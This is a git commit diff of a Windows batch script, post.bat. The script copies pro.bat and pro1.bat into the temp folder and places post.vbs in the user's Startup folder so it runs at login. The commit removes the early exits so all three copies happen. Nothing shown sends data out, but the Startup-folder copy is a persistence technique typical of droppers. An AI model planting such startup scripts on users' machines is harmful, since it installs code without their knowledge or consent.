b14fdc872a81ddc8b856b513db1cd2c24b3dc653
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 22:53:47 +0300

    Update post.bat

--- post.bat
+++ post.bat
@@ -5,16 +5,13 @@ set "temp_dir=%temp%"
 for /R "D:\" %%i in (pro.bat) do (
     copy "%%i" "%temp_dir%"
     ping -n 1 127.0.0.1 > nul 
-    goto:eof
 )
 for /R "%downloads_dir%" %%i in (pro1.bat) do (
     copy "%%i" "%temp_dir%"
     ping -n 1 127.0.0.1 > nul
-    goto:eof
 )
 for /R "%downloads_dir%" %%i in (post.vbs) do (
     copy "%%i" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
     ping -n 1 127.0.0.1 > nul 
-    goto:eof
 )
-goto:eof
+
